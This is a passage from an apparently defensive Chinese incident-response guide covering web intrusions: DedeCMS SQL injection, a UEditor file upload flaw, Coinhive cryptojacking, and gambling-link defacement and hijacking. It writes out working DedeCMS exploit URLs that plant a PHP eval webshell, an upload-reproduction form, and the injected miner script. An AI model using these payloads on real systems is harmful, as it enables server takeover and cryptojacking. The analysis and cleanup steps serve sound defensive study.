62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_mytag\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c \uff084\uff09\u6267\u884c\u5982\u4e0b\u8bed\u53e5\uff0c\u5728/plus\u76ee\u5f55\u4e0b\u751f\u621090sec.php\u4e00\u53e5\u8bdd\u6728\u9a6c http://www.xxxx.com/plus/mytag_js.php?aid=9013 \u5229\u7528\u65b9\u5f0f\u4e09\uff1a\u4f7f/plus/ad_js.php\u6587\u4ef6\u53d8\u4e3a\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid` =19 # \uff082\uff09\u5bf9\u5e94\u7684EXP: /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_myad\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \uff084\uff09\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u5220\u9664\u7f51\u7ad9\u76ee\u5f55\u4e2d\u7684webshell 2\u3001\u6e05\u9664dede_myad\u3001dede_mytag\u6570\u636e\u5e93\u8868\u4e2d\u63d2\u5165\u7684SQL\u8bed\u53e5\uff0c\u9632\u6b62\u518d\u6b21\u88ab\u8c03\u7528\u751f\u6210webshell\u3002 \u5982\u4f55\u9632\u5fa1\uff1f \u7f51\u7ad9\u91c7\u7528\u5f00\u6e90CMS\u642d\u5efa\uff0c\u5efa\u8bae\u53ca\u65f6\u5bf9\u5b98\u65b9\u53d1\u5e03\u7684\u7cfb\u7edf\u8865\u4e01\u4ee5\u53ca\u5185\u6838\u7248\u672c\u8fdb\u884c\u5347\u7ea7\u3002 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6 \u00b6 UEditor\u662f\u767e\u5ea6\u7684\u4e00\u4e2ajavascript\u7f16\u8f91\u5668\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u90fd\u559c\u6b22\u5f15\u7528\u8fd9\u4e2a\u7f16\u8f91\u5668\uff0c\u4f46\u8fd9\u4e2a\u7f16\u8f91\u5668\u5b98\u7f51\u7248\u672c\u4e00\u76f4\u505c\u7559\u57282016-05-26\uff0c\u5df2\u7ecf\u5f88\u4e45\u6ca1\u6709\u66f4\u65b0\u4e86\u3002 0x01 \u73b0\u8c61\u63cf\u8ff0 \u00b6 HIDS\u9884\u8b66\uff1a\u53d1\u73b0\u540e\u95e8(Webshell)\u6587\u4ef6\uff0c\u5efa\u8bae\u60a8\u7acb\u5373\u8fdb\u884c\u5904\u7406\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001\u53d1\u73b0Webshell \u901a\u8fc7\u9884\u8b66\u4fe1\u606f\uff0c\u627e\u5230\u6728\u9a6c\u6587\u4ef6\u8def\u5f84\uff1a \u5907\u6ce8\uff1a\u7d27\u6025\u5904\u7406\uff0c\u901a\u8fc7\u7981\u6b62\u52a8\u6001\u811a\u672c\u5728\u4e0a\u4f20\u76ee\u5f55\u7684\u8fd0\u884c\u6743\u9650\uff0c\u4f7fwebshell\u65e0\u6cd5\u6210\u529f\u6267\u884c\u3002 2\u3001\u5b9a\u4f4d\u6587\u4ef6\u4e0a\u4f20\u65f6\u95f4 \u6839\u636eWebshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\uff0c2020\u5e743\u67089\u65e5 15:08:34 3\u3001 Web\u8bbf\u95ee\u65e5\u5fd7\u5173\u8054\u5206\u6790 \u7531\u4e8e\uff0cIIS\u65e5\u5fd7\u65f6\u95f4\u4e0e\u7cfb\u7edf\u65f6\u95f4\u76f8\u5dee8\u5c0f\u65f6\uff0c\u7cfb\u7edf\u65f6\u95f4\u662f15:08\uff0c\u6211\u4eec\u8fd9\u91cc\u67e5\u770b\u7684\u662f 7:08\u7684\u65e5\u5fd7\u65f6\u95f4\u3002 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage \u627e\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u9694\u95f4\u91cc\uff0c\u6211\u4eec\u4f1a\u6ce8\u610f\u5230\u8fd9\u6837\u4e24\u4e2aueditor\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u521d\u6b65\u6000\u7591\u662fUEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 4\u3001\u672c\u5730\u6f0f\u6d1e\u590d\u73b0 A\u3001\u672c\u5730\u6784\u5efa\u4e00\u4e2ahtml <form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"> <p>shell addr:<input type=\"text\" name=\"source[]\" /></p > <inputtype=\"submit\" value=\"Submit\" /> </form> B\u3001\u4e0a\u4f20webshell\uff0c\u4e0a\u4f20\u6210\u529f \u7ecf\u6f0f\u6d1e\u590d\u73b0\uff0c\u786e\u8ba4UEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 5\u3001\u8fd8\u539f\u653b\u51fb\u8005\u884c\u4e3a \u901a\u8fc7\u76f8\u5173\u6587\u4ef6\u7684\u8bbf\u95ee\u8bb0\u5f55\u8fdb\u884c\u5173\u8054\u5206\u6790\uff0c\u653b\u51fb\u8005\u901a\u8fc7 ueditor\u7f16\u8f91\u5668\u6210\u529f\u4e0a\u4f20webshell\u3002 0x03 \u4e8b\u4ef6\u5904\u7406 \u00b6 1\u3001 \u5220\u9664Webshell \u6e05\u695a\u5df2\u53d1\u73b0\u7684webshell\uff0c\u5e76\u5c1d\u8bd5\u67e5\u627e\u53ef\u80fd\u9690\u85cf\u7684webshell\u3002 2\u3001\u4ee3\u7801\u5b8c\u6574\u6027\u9a8c\u8bc1 \u6211\u4eec\u6765\u601d\u8003\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u514d\u6740\u7684Webshell\u9690\u85cf\u5728\u6570\u4ee5\u4e07\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u600e\u4e48\u641e\uff1f \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u68c0\u67e5\u7f51\u7ad9\u7684\u6e90\u7801\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002 \u64cd\u4f5c\u8fc7\u7a0b\uff1a \u901a\u8fc7\u67e5\u770b\u670d\u52a1\u5668\u4e0a\u5df2\u90e8\u7f72\u7684\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u627e\u7814\u53d1\u540c\u4e8b\u8981\u540c\u6837\u7248\u672c\u7684\u4ee3\u7801\u3002\u628a\u7eaf\u51c0\u6e90\u7801\u7684\u6240\u6709\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u518d\u5230\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u6b21hash\u503c\uff0c\u901a\u8fc7\u6bd4\u5bf9hash\u503c\uff0c\u8f93\u51fa\u65b0\u521b\u5efa\u7684/\u88ab\u4fee\u6539\u8fc7\u7684/\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 3\u3001\u7cfb\u7edf\u5165\u4fb5\u6392\u67e5 \u5bf9\u7cfb\u7edf\u505a\u4e00\u4e2a\u6574\u4f53\u6392\u67e5\uff0c\u786e\u8ba4\u662f\u5426\u5b58\u5728\u540e\u95e8 4\u3001\u4ee3\u7801\u4fee\u590d \u53cd\u9988\u7ed9\u76f8\u5173\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002","title":"Web\u5b9e\u6218"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_1","text":"\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_2","text":"","title":"\u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#1","text":"\u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002","title":"1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#2web","text":"\u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3","title":"2\u3001Web \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#3","text":"\u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49","title":"3\u3001\u6f0f\u6d1e\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#4","text":"\u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668","title":"4\u3001\u6f0f\u6d1e\u590d\u73b0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#5","text":"\u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002","title":"5\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#2","text":"\u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002","title":"\u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_3","text":"\u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100%","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_4","text":"\u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002","title":"\u95ee\u9898\u89e3\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#3_1","text":"\u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7f51\u9875\u3002\u800c\u4e14\uff0c\u653b\u51fb\u8005\u5728\u6302\u9ed1\u9875\u4ee5\u540e\uff0c\u4f1a\u5728\u4e00\u4e9b\u5c0f\u8bba\u575b\u6ce8\u518c\u9a6c\u7532\u5c06\u4f60\u7684\u7f51\u7ad9\u9ed1\u9875\u94fe\u63a5\u53d1\u5230\u8bba\u575b\uff0c\u5f15\u722c\u866b\u6536\u5f55\u3002\u5728\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7f51\u7ad9\u5730\u5740\u65f6\uff0c\u6536\u5f55\u4e86\u4e00\u4e9b\u4f1a\u51fa\u73b0\u4e00\u4e9b\u535a\u5f69\u9875\u9762\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u5f62\u8c61\u3002","title":"\u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_5","text":"\u7f51\u7ad9\u5b58\u5728\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5e38\u89c1\u4e8e\u4e00\u4e9b\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u7684\u5f00\u6e90CMS\uff0c\u5229\u75280day\u6279\u91cf\u62ff\u7ad9\u4e0a\u4f20\u9ed1\u9875\u3002","title":"\u539f\u56e0\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_6","text":"\u67d0\u7f51\u7ad9\u88ab\u6302\u4e86\u975e\u5e38\u591a\u535a\u5f69\u94fe\u63a5\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html http://www.xxx.com/upload/aomendduchangzaixian/index.html http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html \u94fe\u63a5\u53ef\u4ee5\u8bbf\u95ee\uff0c\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u8def\u5f84\u4e5f\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\uff0c\u4f46\u662f\u6253\u5f00\u7f51\u7ad9\u76ee\u5f55\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e9b\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u85cf\u5728\u4e86\u54ea\uff1f \u8bbf\u95ee\u8fd9\u4e9b\u94fe\u63a5\uff0c\u8df3\u8f6c\u5230\u5982\u56fe\u9875\u9762\uff1a","title":"\u73b0\u8c61\u63cf\u8ff0\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_7","text":"1\u3001\u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u518d\u6b21\u67e5\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u534a\u900f\u660e\u7684\u6587\u4ef6\u5939\uff0c\u6e05\u695a\u9690\u85cf\u6587\u4ef6\u5939\u53ca\u6240\u6709\u9875\u9762 3\u3001\u7136\u540e\u6e05\u9664IIS\u4e34\u65f6\u538b\u7f29\u6587\u4ef6 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$ _gzip_D \\WEB\\WEBUI\\UPLOAD 4\u3001\u6295\u8bc9\u5feb\u7167\uff0c\u7533\u8bf7\u5220\u9664\u76f8\u5173\u7684\u7f51\u9875\u6536\u5f55\uff0c\u51cf\u5c11\u5bf9\u7f51\u7ad9\u7684\u5f71\u54cd\u3002","title":"\u95ee\u9898\u5904\u7406\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#4_1","text":"\u65b0\u95fb\u6e90\u7f51\u7ad9\u4e00\u822c\u6743\u91cd\u8f83\u9ad8\uff0c\u6536\u5f55\u5feb\uff0c\u80fd\u591f\u88ab\u641c\u7d22\u5f15\u64ce\u4f18\u5148\u6536\u5f55\uff0c\u662f\u9ed1\u7070\u4ea7\u63a8\u5e7f\u5f15\u6d41\u7684\u5fc5\u4e89\u4e4b\u5730\uff0c\u5f88\u5bb9\u6613\u6210\u4e3a\u88ab\u653b\u51fb\u7684\u5bf9\u8c61\u3002\u88ab\u9ed1\u4ee5\u540e\u4e3b\u8981\u6302\u7684\u4e0d\u826f\u4fe1\u606f\u5185\u5bb9\u4e3b\u8981\u662f\u535a\u5f69\u516d\u5408\u5f69\u7b49\u8d4c\u535a\u7c7b\u5185\u5bb9\uff0c\u65b0\u95fb\u6e90\u7f51\u7ad9\u7a0b\u5e8f\u65e0\u8bba\u662f\u81ea\u4e3b\u5f00\u53d1\u7684\u8fd8\u662f\u5f00\u6e90\u7a0b\u5e8f\uff0c\u90fd\u6709\u88ab\u9ed1\u7684\u53ef\u80fd\uff0c\u5f00\u6e90\u7a0b\u5e8f\u66f4\u5bb9\u6613\u88ab\u9ed1\u3002","title":"\u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_8","text":"\u67d0\u65b0\u95fb\u6e90\u7f51\u7ad9\u9996\u9875\u5e7f\u544a\u94fe\u63a5\u88ab\u52ab\u6301\u5230\u83e0\u83dc\u7f51\u7ad9 \u6709\u4e09\u4e2a\u5e7f\u544a\u4e13\u9898\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.cn/zhuanti/yyysc/index.shtml http://www.xxx.cn/zhuanti/wwwsc/index.shtml http://www.xxx.cn/zhuanti/zzzsc/index.shtml \u70b9\u51fb\u8fd9\u4e09\u6761\u94fe\u63a5\u4f1a\u8df3\u8f6c\u5230\u535a\u5f69\u7f51\u7ad9\u3002\u7b80\u5355\u6293\u5305\u5206\u6790\u4e00\u4e0b\u8fc7\u7a0b\uff1a \u53ef\u4ee5\u53d1\u73b0\u6b64\u65f6\u8fd9\u4e2a\u8fd4\u56de\u9875\u9762\u5df2\u88ab\u52ab\u6301\uff0c\u5e76\u4e14\u52a0\u8f7d\u4e86\u7b2c\u4e09\u65b9js\u6587\u4ef6\uff0c http://xn--dpqw2zokj.com/N/js/dt.js \uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8be5\u6587\u4ef6\uff1a dt.js\u8fdb\u4e00\u6b65\u52a0\u8f7d\u4e86\u53e6\u4e00\u6761js\uff0c\u8bbf\u95eehttp://xn--dpqw2zokj.com/N/js/yz.js \u6211\u4eec\u53d1\u73b0\u94fe\u63a5\u8df3\u8f6c\u5230https://lemcoo.com/?dt\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\uff0c\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\uff0c\u8bbf\u95ee\u540e\u4f1a\u968f\u673a\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u8d4c\u535a\u7f51\u7ad9\u3002","title":"\u73b0\u8c61\u63cf\u8ff0\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_9","text":"\u627e\u5230url\u5bf9\u5e94\u7684\u6587\u4ef6\u4f4d\u7f6e\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u94fe\u63a5\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e09\u6761\u94fe\u63a5\u90fd\u662f\u4ee5\u201csc\u201d\u540e\u7f00\u3002 \u5bf9Nginx\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0Nginx\u914d\u7f6e\u6587\u4ef6VirtualHost.conf\u88ab\u7be1\u6539\uff0c\u901a\u8fc7\u53cd\u5411\u4ee3\u7406\u5339\u914d\u4ee5\u201csc\u201d\u540e\u7f00\u7684\u4e13\u9898\u94fe\u63a5\uff0c\u52ab\u6301\u5230 http://103.233.248.163 \uff0c\u8be5\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\u3002 \u5220\u9664\u6076\u610f\u4ee3\u7406\u540e\uff0c\u4e13\u9898\u94fe\u63a5\u8bbf\u95ee\u6062\u590d\u3002","title":"\u95ee\u9898\u5904\u7406\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#5_1","text":"PC\u7aef\u8bbf\u95ee\u6b63\u5e38\uff0c\u79fb\u52a8\u7aef\u8bbf\u95ee\u51fa\u73b0\u5f02\u5e38\uff0c\u6bd4\u5982\u63d2\u5165\u5f39\u7a97\u3001\u5d4c\u5165\u5f0f\u5e7f\u544a\u548c\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u5c06\u5e72\u6270\u7528\u6237\u7684\u6b63\u5e38\u4f7f\u7528\uff0c\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u6781\u5927\u4f24\u5bb3\u3002","title":"\u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_10","text":"\u90e8\u5206\u7f51\u7ad9\u7528\u6237\u53cd\u9988\uff0c\u624b\u673a\u6253\u5f00\u7f51\u7ad9\u5c31\u4f1a\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_11","text":"\u8bbf\u95ee\u7f51\u7ad9\u9996\u9875\uff0c\u6293\u53d6\u5230\u4e86\u4e00\u6761\u6076\u610fjs\uff1a http://js.zadovosnjppnywuz.com/caonima.js \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u8fd9\u6bb5js\u4ee3\u7801\u5224\u65ad\u624b\u673a\u8bbf\u95ee\u6765\u6e90\uff0c\u52ab\u6301\u79fb\u52a8\u7aef\uff08\u5982\u624b\u673a\u3001ipad\u3001Android\u7b49\uff09\u6d41\u91cf\uff0c\u8df3\u8f6c\u5230 https://262706.com\u3002 \u8fdb\u4e00\u6b65\u8bbf\u95ee 